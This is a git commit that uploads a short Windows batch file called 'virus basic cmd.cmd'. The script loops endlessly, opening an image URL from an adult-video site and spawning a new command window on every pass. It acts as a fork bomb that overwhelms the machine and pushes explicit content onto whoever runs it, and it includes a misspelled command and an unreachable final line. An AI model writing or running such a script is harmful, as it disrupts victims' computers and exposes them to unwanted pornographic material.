a1f6e4d2d59dfa09d5f6834b6c036f503978a17a
Barry51203 <67968454+Barry51203@users.noreply.github.com>
2020-07-07 23:07:29 +0700

    Add files via upload

---
+++ virus basic cmd.cmd
@@ -0,0 +1,11 @@
+@echo off
+tittle W.BOOM
+color a
+cls 
+
+:Supachok 
+start "" https://cdn77-pic.xvideos-cdn.com/videos/thumbslll/a6/74/1c/a6741c133d5f91918c9dbac1e68b1a0b/a6741c133d5f91918c9dbac1e68b1a0b.11.jpg
+start cmd.exe
+goto Supachok
+echo Attack...
+
